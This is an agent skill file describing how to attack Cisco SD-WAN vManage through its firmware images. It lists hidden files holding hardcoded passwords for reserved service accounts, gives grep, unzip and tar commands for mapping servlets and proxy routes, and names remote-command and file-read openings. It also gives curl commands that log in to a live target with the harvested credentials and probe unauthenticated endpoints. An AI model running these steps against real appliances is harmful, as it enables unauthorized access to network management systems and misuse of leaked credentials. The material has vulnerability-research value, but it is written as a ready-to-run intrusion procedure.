---
name: cisco-vmanage-firmware-analysis
description: "Use when analyzing Cisco SD-WAN vManage firmware images (disk1/disk2 layout) to extract hardcoded credentials, map containerized service architecture, and identify authentication bypass or file-access vectors. Covers Envoy proxy, WildFly VFS, Django HTTP proxy, and reserved service accounts. NOT for: generic firmware analysis without vManage-specific paths, live network testing without firmware access, or non-Cisco products."
category: general
---

## Cisco SD-WAN vManage Containerized Firmware Analysis

### Architecture Overview
- **disk1** = rootfs ( `/opt/web-app`, `/var/lib/django`, `/etc/ncs.conf` )
- **disk2** = docker layers + runtime configs ( `/nms/docker/aufs/diff/`, `/containers/config/` )
- **Port 8443** = Envoy service-proxy (host networking) fronting multiple containers
- **Port 8080** = WildFly application server (internal, via `application-server` container)
- **Port 9080** = Flask reporting service (binds `127.0.0.1`, not externally reachable by default)
- **Django/uWSGI** = Python proxy layer for external cloud integrations

### Step 1: Harvest Hardcoded Credentials Immediately
Read these hidden files before any deep code search:

| File Path | Purpose | Associated User |
|---|---|---|
| `./disk1/opt/web-app/etc/.cor` | Cloud OnRamp password | `viptela-reserved-uc` or `viptela-reserved-cloud` |
| `./disk2/containers/config/data-collection-agent/.dca` | DCA proxy password | `viptela-reserved-dca` |
| `./disk1/opt/web-app/etc/.vmanage_service_user.json` | Encrypted service passwords (olapdb, es, neo4j, uc, zookeeper, sdavc) | Various internal users |
| `./disk1/opt/web-app/etc/.kspass` | Keystore password | — |

Search Python proxy code to confirm username mappings:
bash
grep -nE "DCA_DEFAULT_USERNAME|COR_USERNAME|_AUTO_USER|_PFILE" \
  ./disk1/var/lib/django/apps/httpProxy/proxy.py \
  ./disk1/var/lib/django/apps/cor/scripts/cor.py \
  ./disk2/extra-packages/*/extra/bin/upgrade-context.py


### Step 2: Extract WildFly VFS JARs for Servlet/REST Analysis
The deployed WAR is exploded into VFS; extract JARs to find file-download/upload endpoints:
bash
VFSDIR="./disk2/nms/docker/aufs/diff/*/var/lib/wildfly/standalone/tmp/vfs/deployment/deployment*"
for j in "$VFSDIR"/*.jar*; do
    unzip -p "$j" '*.class' 2>/dev/null | strings | grep -iE "download|upload|install|import|getPathInfo|pathInfo"
done

Key classes to hunt for:
- `AbstractDownloadServlet`, `*FileDownloadServlet`, `*UploadServlet`
- `TenantMigrationRestfulResource`, `TenantBackupRestoreRestfulResource`
- `DisasterRecoveryRestfulResource`
- `InstallPackageFileDownloadServlet`

### Step 3: Read CSRF Whitelist & Service Topology
- `./disk1/opt/web-app/etc/csrf.properties` — lists `/dataservice/*` paths excluded from CSRF validation (many return 200 unauthenticated).
- `./disk1/opt/web-app/etc/server_configs.json` — maps internal service names to ports.

### Step 4: Extract Envoy Reverse-Proxy Routes
Envoy config is inside the service-proxy container image:
bash
mkdir -p /tmp/sp && tar -xzf \
  ./disk2/extra-packages/*/containers/service-proxy/serviceproxy.tar.gz -C /tmp/sp
find /tmp/sp -name "layer.tar" -exec tar xf {} \;
cat /tmp/sp/var/lib/envoy/envoy.yaml

Look for `route_config` entries pointing `/dataservice/dca/*` → `localhost:8080`, `/` → aggregate cluster, etc.

### Step 5: Dynamic Validation
1. **Authenticate reserved users** against the live target on port 8443:
   bash
   curl -s -k -X POST "https://<target>:8443/j_security_check" \
     -d "j_username=viptela-reserved-uc" \
     -d "j_password=<value_from_.cor>" -c /tmp/uc.txt
   
2. **Fetch XSRF token**:
   bash
   TOKEN=$(curl -s -k "https://<target>:8443/dataservice/client/token" -b /tmp/uc.txt)
   
3. **Confirm session** (403 = authenticated but unauthorized; 302 to login = failed):
   bash
   curl -s -k -H "X-XSRF-TOKEN: $TOKEN" -b /tmp/uc.txt \
     -w "%{http_code}" "https://<target>:8443/dataservice/tenant/"
   

### Step 6: RCE / Command Execution Vectors
- `./disk1/opt/web-app/drconsul/scripts/nms_upgrade_service.py` — exposes `/execute-command` (HTTP 405 confirms route exists). Check `UC_HTTP_SERVER_USERNAME`/`PASSWORD` drawn from `.vmanage_service_user.json`.
- `./disk2/nms/docker/aufs/diff/*/reporting/app.py` — Flask app with potential LFI via `?file=` parameter (only reachable if port 9080 is exposed or proxied).
- Java `*Install*` servlets and `TenantBackupRestoreRestfulResource` — inspect for path-traversal in `download/{path : .+}` or `import` handlers.

### Key Commands Summary
bash
# Hidden credential sweep
find ./disk1/opt/web-app/etc/ ./disk2/containers/config/ -maxdepth 3 -name ".*" -type f

# Proxy code analysis
grep -rnE "password|secret|credential|_PFILE|_AUTO_USER" ./disk1/var/lib/django/apps/

# VFS JAR listing
find ./disk2/nms/docker/aufs/diff/ -path "*/wildfly/standalone/tmp/vfs/*" -name "*.jar*"

# Unauthenticated endpoint probe (from csrf.properties)
for ep in /dataservice/client/server/ready /dataservice/api-docs/ /dataservice/client/token; do
    curl -s -k -o /dev/null -w "%{http_code}" "https://<target>:8443$ep"
done

